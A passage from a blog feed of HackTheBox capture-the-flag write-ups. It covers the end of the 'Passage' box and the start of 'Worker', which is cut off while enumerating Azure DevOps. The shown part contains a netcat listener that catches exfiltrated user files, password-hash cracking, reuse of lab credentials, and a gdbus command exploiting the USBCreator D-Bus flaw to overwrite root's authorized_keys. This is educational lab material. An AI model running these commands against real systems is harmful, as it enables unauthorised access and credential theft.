-$ nc -nvlp <span class="m">9000</span> &gt; cdata.users
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
-connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.206<span class="o">]</span> <span class="m">55022</span>
-</code></pre></div><p>I can perform a bulk decode on the file contents after removing the PHP tags.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «passage» «10.10.14.31»
-$ cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d
-cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d
-a:1:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:16:<span class="s2">&#34;paul@passage.htb&#34;</span><span class="p">;</span>s:10:<span class="s2">&#34;paul-coles&#34;</span><span class="p">;</span><span class="o">}}</span>a:1:<span class="o">{</span>s:2:<span class="s2">&#34;id&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>i:1598829833<span class="p">;</span>s:6:<span class="s2">&#34;egre55&#34;</span><span class="p">;</span><span class="o">}}</span>a:1:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:15:<span class="s2">&#34;ahaha@gmail.com&#34;</span><span class="p">;</span>s:8:<span class="s2">&#34;ivanpogi&#34;</span><span class="p">;</span><span class="o">}}</span>a:2:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:15:<span class="s2">&#34;egre55@test.com&#34;</span><span class="p">;</span>s:6:<span class="s2">&#34;egre55&#34;</span><span class="p">;</span><span class="o">}</span>s:4:<span class="s2">&#34;name&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>a:11:<span class="o">{</span>s:2:<span class="s2">&#34;id&#34;</span><span class="p">;</span>s:10:<span class="s2">&#34;1599412470&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;name&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>s:3:<span class="s2">&#34;acl&#34;</span><span class="p">;</span>s:1:<span class="s2">&#34;4&#34;</span><span class="p">;</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>s:13:<span class="s2">&#34;debo@debo.com&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;nick&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;pass&#34;</span><span class="p">;</span>s:64:<span class="s2">&#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;more&#34;</span><span class="p">;</span>s:60:<span class="s2">&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;</span><span class="p">;</span>s:6:<span class="s2">&#34;avatar&#34;</span><span class="p">;</span>s:20:<span class="s2">&#34;avatar_debo_bash.php&#34;</span>
-...&lt;SNIP&gt;...
-</code></pre></div><p>And that was a mess.</p>
-<p>Among these outputs, there is one that interesting.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...[SNIP]...&#34;pass&#34;;s:64:&#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&#34;...[SNIP]...
-</code></pre></div><p><code>hash-identifier</code> identifies it as SHA-256.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «passage» «192.168.43.234»
-$ hash-identifier 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
-   <span class="c1">#########################################################################</span>
-   <span class="c1">#     __  __                     __           ______    _____           #</span>
-   <span class="c1">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span>
-   <span class="c1">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span>
-   <span class="c1">#     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span>
-   <span class="c1">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span>
-   <span class="c1">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span>
-   <span class="c1">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span>
-   <span class="c1">#                                                             By Zion3R #</span>
-   <span class="c1">#                                                    www.Blackploit.com #</span>
-   <span class="c1">#                                                   Root@Blackploit.com #</span>
-   <span class="c1">#########################################################################</span>
---------------------------------------------------
-
-Possible Hashs:
-<span class="o">[</span>+<span class="o">]</span> SHA-256
-<span class="o">[</span>+<span class="o">]</span> Haval-256
-...&lt;SNIP&gt;...
-</code></pre></div><p>It turns out that those exfiltrated files are how CuteNews stores its database (flat-file database, like <code>/etc/passwd</code>).</p>
-<p><div class="img-container"><img src="imgs/image-20210508032901929.png" alt="image-20210508032901929"  /></div>
-</p>
-<p>Knowing that, I can add another filter using <code>grep</code> to grab the password hashes.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «passage» «192.168.43.234»
-$ cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d <span class="p">|</span> grep -o -E -e <span class="s2">&#34;[0-9a-f]{64}&#34;</span>
-b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52
-7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
-5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
-231cd4eb21af3071fd441d5bb7e42dc5fd6f606cd20a8e3c158b7e7c2923f426
-41e5653fc7aeb894026d6bb7b2db7f65902b454945fa8fd65a6327047b5277fb
-4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
-03d09a66086da4ea6482d717ef1b33e23867afd965e2074e342584157393f91c
-e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
-f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
-84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
-4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
-e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
-59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4
-</code></pre></div><h4 id="cracking-the-hashes">Cracking the Hashes</h4>
-<p><code>hashcat</code> recovered five passwords.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ./hashcat.exe -m <span class="m">1400</span> hashes/passage.hashes ../rockyou.txt -O --show
-b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52:debo
-5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password
-e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
-e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hacker
-59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4:mario
-</code></pre></div><h4 id="su---paul">SU - paul</h4>
-<p>I tried to spray the passwords on SSH, but it wanted an SSH key. I tried again with <code>su</code>, and password <code>atlanta1</code> worked on <code>paul</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@passage:/home$ su paul 
-su paul
-Password: atlanta1
-paul@passage:~$ 
-</code></pre></div><h3 id="shell-as-nadav">Shell as nadav</h3>
-<h4 id="shared-ssh-keys">Shared SSH keys</h4>
-<p>Escalating from <code>paul</code> to <code>nadav</code> is pretty straight forward, I found out that user <code>nadav</code> uses the same SSH keys as user <code>paul</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">paul@passage:~/.ssh$ cat id_rsa.pub <span class="o">&amp;&amp;</span> cat authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
-</code></pre></div><p>So I can just SSH from <code>paul</code> to <code>nadav</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">paul@passage:~/.ssh$ ssh nadav@passage.htb
-Last login: Sun Sep  <span class="m">6</span> 11:12:03 <span class="m">2020</span> from 127.0.0.1
-nadav@passage:~$ id
-id
-<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,113<span class="o">(</span>lpadmin<span class="o">)</span>,128<span class="o">(</span>sambashare<span class="o">)</span>
-</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
-<h4 id="internal-enumeration-1">Internal enumeration</h4>
-<p>Since <code>nadav</code> is a member of the <code>sudo</code> group, I can just type <code>sudo su</code> to escalate to root, but unfortunately it requires <code>nadav</code>&rsquo;s password.</p>
-<p>So I looking around <code>nadav</code>&rsquo;s home directory, and there is a <code>.viminfo</code> file (not sure if it&rsquo;s from the box or other players).</p>
-<p><div class="img-container"><img src="imgs/c0375013a91f483582b37eebffa521d4.png" alt="c0375013a91f483582b37eebffa521d4"  /></div>
-</p>
-<p>The file contains the following information.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
-# Command Line History (newest to oldest):
-:wq
-:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g
-
-
-...&lt;SNIP&gt;...
-# File marks:
-&#39;0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&#39;1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-
-# Jumplist (newest first):
--&#39;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
--&#39;  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
--&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
--&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
--&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
--&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-
-# History of marks within files (newest to oldest):
-
-&gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-        &#34;       12      7
-
-&gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-        &#34;       2       0
-        .       2       0
-        +       2       0
-</code></pre></div><p>The history of files points to these two configuration files:</p>
-<ul>
-<li><code>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</code></li>
-<li><code>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</code></li>
-</ul>
-<p>The <code>51-ubuntu-admin.conf</code> defines there are only two groups that can be used for authentication when administrator authentication is needed, <code>sudo</code> and <code>admin</code>. This file is used by <a href="https://www.freedesktop.org/software/polkit/docs/0.105/pklocalauthority.8.html">Polkit</a>, which allows unprivileged process to communicate with the privileged ones. In the GUI, the prompt that asks you to enter a password when performing an administrative tasks are using Polkit.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-<span class="o">[</span>Configuration<span class="o">]</span>
-<span class="nv">AdminIdentities</span><span class="o">=</span>unix-group:sudo<span class="p">;</span>unix-group:admin
-</code></pre></div><p>I don&rsquo;t really understand in depth about <code>com.ubuntu.USBCreator.conf</code>. What I know is, this configuration file is used by a service called “com.ubuntu.USBCreator” that is owned by root. The ones that can invoke the methods on this service are constrained by PolicyKit/Polkit, and they are anyone in the <code>sudo</code> or the <code>admin</code> group (defined by the <code>51-ubuntu-admin.conf</code> file)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml">nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-<span class="cp">&lt;!DOCTYPE busconfig PUBLIC
-</span><span class="cp"> &#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&#34;
-</span><span class="cp"> &#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&#34;&gt;</span>
-<span class="nt">&lt;busconfig&gt;</span>
-
-  <span class="c">&lt;!-- Only root can own the service --&gt;</span>
-  <span class="nt">&lt;policy</span> <span class="na">user=</span><span class="s">&#34;root&#34;</span><span class="nt">&gt;</span>
-    <span class="nt">&lt;allow</span> <span class="na">own=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span><span class="nt">/&gt;</span>
-  <span class="nt">&lt;/policy&gt;</span>
-
-  <span class="c">&lt;!-- Allow anyone to invoke methods (further constrained by
-</span><span class="c">       PolicyKit privileges --&gt;</span>
-  <span class="nt">&lt;policy</span> <span class="na">context=</span><span class="s">&#34;default&#34;</span><span class="nt">&gt;</span>
-    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
-           <span class="na">send_interface=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span><span class="nt">/&gt;</span>
-    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
-           <span class="na">send_interface=</span><span class="s">&#34;org.freedesktop.DBus.Introspectable&#34;</span><span class="nt">/&gt;</span>
-    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
-           <span class="na">send_interface=</span><span class="s">&#34;org.freedesktop.DBus.Properties&#34;</span><span class="nt">/&gt;</span>
-  <span class="nt">&lt;/policy&gt;</span>
-
-<span class="nt">&lt;/busconfig&gt;</span>
-</code></pre></div><p>From here, it looks only <code>nadav</code> that can invoke the methods of this service</p>
-<h4 id="usbcreator-d-bus-interface-vulnerability">USBCreator D-Bus Interface Vulnerability</h4>
-<p>There is a research about a vulnerability in USBCreator D-Bus Interface, which can be used for local privilege escalation<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>. The research summary as follows:</p>
-<p>&ldquo;<em>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root - without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. The issue was resolved in June when Ubuntu <a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1832337">patched</a> the relevant packages in response to a vulnerability disclosure from Unit 42.</em>&rdquo;</p>
-<p>The bug was first reported in 2016<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>, and the affected Ubuntu version is 16.04.</p>
-<p><div class="img-container"><img src="imgs/image-20210508150754640.png" alt="image-20210508150754640"  /></div>
-</p>
-<p>The current machine is not an exact match, but since the vulnerability is patched in 2019, it may affect this version too.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nadav@passage:~$ uname -a
-Linux passage 4.15.0-45-generic <span class="c1">#48~16.04.1-Ubuntu SMP Sun Sep 6 14:31:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
-</code></pre></div><h4 id="overwrite-authorized_keys">Overwrite authorized_keys</h4>
-<p>One of the tools used by the researcher to exploit the vulnerability is a CLI-based called <code>gdbus</code>.</p>
-<p>With user <code>nadav</code>, I can try to overwrite the authorized_keys file contents in the root directory with my public key.</p>
-<p>I&rsquo;ll put my public key named <code>key</code> in <code>/dev/shm/</code>, and then I&rsquo;ll  invoke the following command:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/key /root/.ssh/authorized_keys <span class="nb">true</span>
-<span class="nb">true</span>
-<span class="o">()</span>
-</code></pre></div><p>I tried to login as root using my private key, and it worked.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «passage» «10.10.14.31»
-$ ssh -i root_rsa root@10.10.10.206
-Last login: Fri Mar  <span class="m">5</span> 17:33:39 <span class="m">2020</span> from 10.10.14.7
-root@passage:~# ls -l
-total <span class="m">12</span>
-drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Jul <span class="m">21</span>  <span class="m">2020</span> exploits
-
--r-------- <span class="m">1</span> root root   <span class="m">33</span> Mar  <span class="m">5</span> 17:05 root.txt
-root@passage:~# 
-</code></pre></div><section class="footnotes" role="doc-endnotes">
-<hr>
-<ol>
-<li id="fn:1" role="doc-endnote">
-<p><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-<li id="fn:2" role="doc-endnote">
-<p><a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149">https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-</ol>
-</section>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Worker</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</link>
-      <pubDate>Mon, 03 May 2021 17:01:02 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</guid>
-      <description>Learn how Azure Pipelines can be abused</description>
-      <content:encoded><![CDATA[<p>Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps. Dropping a web shell into one of the live sites allows me to gain foothold on the system.  Enumerating the system reveals another credentials which can also be used to login into Azure DevOps. With these credentials, I&rsquo;m able to gain administrator access through Azure Pipeline.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>SVN enumeration</li>
-<li>Windows enumeration</li>
-<li>Exploiting Azure Pipelines</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
-<li>Nmap - Preinstalled in Kali Linux</li>
-<li>svn cli client - Preinstalled in Kali Linux</li>
-<li>Evil-WinRM - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>An initial TCP scan with <code>nmap</code> discovers two open ports: 80 (HTTP) and 3690 (Subversion).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «worker» «10.10.14.19» 
-$ nmap -sC -sV -oN worker-initial -v 10.10.10.203
-<span class="c1"># Nmap 7.80 scan initiated Sun Aug 16 11:35:56 2020 as: nmap -sC -sV -oN worker-initial -v 10.10.10.203</span>
-Nmap scan report <span class="k">for</span> dimension.worker.htb <span class="o">(</span>10.10.10.203<span class="o">)</span>
-Host is up <span class="o">(</span>0.16s latency<span class="o">)</span>.
-
-PORT     STATE SERVICE  VERSION
-80/tcp   open  http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
-<span class="p">|</span>_http-title: Service Unavailable
-3690/tcp open  svnserve Subversion
-Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-</code></pre></div><p>Performing another scan on typical Active Directory DC ports shows only WinRM (5985) is open.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «worker» «10.10.14.19»
-$ nmap -p53,445,389,5985 10.10.10.203
-Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-31 13:34 EST
-Host is up <span class="o">(</span>0.013s latency<span class="o">)</span>.
-
-PORT     STATE     SERVICE
-<span class="m">53</span>       filtered  domain
-<span class="m">389</span>      filtered  ldap
-<span class="m">445</span>      filtered  microsoft-ds
-<span class="m">5985</span>     open      wsman
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>Visiting the port 80 displays the IIS default page.</p>
-<p><div class="img-container"><img src="imgs/image-20210503174900610.png" alt="image-20210503174900610"  /></div>
-</p>
-<h3 id="tcp-3690---subversionsvn">TCP 3690 - Subversion/SVN</h3>
-<p>This is my first encounter with Subversion, it is a software for version control that is similar to git. To interact with this service, I&rsquo;ll need the Subversion client. Fortunately, it was preinstalled in Kali Linux.</p>
-<p>The general usage is as follows:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ svn &lt;sub-command&gt; svn://<span class="o">[</span>ip<span class="o">]</span>
-</code></pre></div><ul>
-<li>Example of subcommand: <code>ls</code>, <code>cat</code>, <code>info</code>, <code>log</code>.</li>
-</ul>
-<p>With the subcommand <code>ls</code>, I can list the repository contents.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «worker» «192.168.2.103»
-$ svn ls svn://10.10.10.203
-dimension.worker.htb/
-moved.txt
-</code></pre></div><p>The content of <code>moved.txt</code> tells that the svn repository is no longer maintained, and the latest repo is available at <code>http://devops.worker.htb</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
-$ svn cat svn://10.10.10.203/moved.txt
-This repository has been migrated and will no longer be maintaned here.
-You can find the latest version at: http://devops.worker.htb
-
-// The Worker team :<span class="o">)</span>
-</code></pre></div><p>With the subcommand <code>info</code>, I find the author of the repository. It also reveals that the repository has 5 revisions (commit).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «worker» «192.168.2.103»
-$ svn info svn://10.10.10.203
-Path: .
-URL: svn://10.10.10.203
-Relative URL: ^/
-Repository Root: svn://10.10.10.203
-Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
-Revision: <span class="m">5</span>
-Node Kind: directory
-Last Changed Author: nathen
-Last Changed Rev: <span class="m">5</span>
-Last Changed Date: 2020-06-20 09:52:00 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span>
-</code></pre></div><p>I can check the revision log using the sub command <code>log</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «worker» «192.168.2.103»
-$ svn log svn://10.10.10.203
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-r5 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:52:00 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
-Added note that repo has been migrated
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-r4 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:50:20 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
-Moving this repo to our new devops server which will handle the deployment <span class="k">for</span> us
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-r3 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:46:19 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
--
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-r2 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:45:16 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
-Added deployment script
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-r1 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:43:43 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
-First version
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-</code></pre></div><p>The commit message on <code>r2</code> seems interesting.</p>
-<p>I can check the differences between <code>r1</code> and <code>r2</code> using the subcommand <code>diff</code>. The output shows there is a hard-coded credentials.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «worker» «192.168.2.103»
-$ svn diff -r 1:2 svn://10.10.10.203/
-</code></pre></div><p><div class="img-container"><img src="imgs/image-20210503175056134.png" alt="image-20210503175056134"  /></div>
-</p>
-<p>From here, I&rsquo;ll take note about what I&rsquo;ve found here.</p>
-<ul>
-<li>Two subdomains: <code>dimension.worker.htb</code> and <code>devops.worker.htb</code></li>
-<li>A set of credentials: <code>nathen:wendel98</code></li>
-</ul>
-<p>I&rsquo;ll add those two subdomains to my <code>/etc/hosts</code> file.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">10.10.10.203 dimension.worker.htb devops.worker.htb
-</code></pre></div><p>Then after I make sure there is nothing left, I&rsquo;ll revisit port 80 with the newly discovered subdomain.</p>
-<h3 id="tcp-80---dimensionworkerhtb">TCP 80 - dimension.worker.htb</h3>
-<p>Visiting <code>dimension.worker.htb</code> presented with a static page.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175111010.png" alt="image-20210503175111010"  /></div>
-</p>
-<p>It even leads to others static site (with subdomain) which I think they are just decoy.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175127918.png" alt="image-20210503175127918"  /></div>
-</p>
-<p>Before moving on, I&rsquo;ll add all the subdomains I found on <code>/#work</code> to my <code>/etc/hosts</code>. They are:</p>
-<ul>
-<li><code>alpha.worker.htb</code></li>
-<li><code>cartoon.worker.htb</code></li>
-<li><code>lens.worker.htb</code></li>
-<li><code>solid-state.worker.htb</code></li>
-<li><code>spectral.worker.htb</code></li>
-<li><code>story.worker.htb</code></li>
-</ul>
-<p>Now I&rsquo;ll jump over to the mentioned DevOps server at <code>http://devops.worker.htb</code>.</p>
-<h3 id="azure-devops---smarthotel360">Azure DevOps - SmartHotel360</h3>
-<p>Visiting <code>http://devops.worker.htb</code> pops an authentication prompt. It logs me in after I entered the credentials I obtained from SVN, and the user, <code>nathen</code>, is currently working on a project called &ldquo;SmartHotel360&rdquo;.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175154637.png" alt="image-20210503175154637"  /></div>
-</p>
-<p>My first objective is to find out what permission do this user have. I clicked the project and try to lookup into the Project Settings.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175211414.png" alt="image-20210503175211414"  /></div>
-</p>
-<p>User permission or group related settings are found to be under the Security menu (Project Settings -&gt; Security Settings).</p>
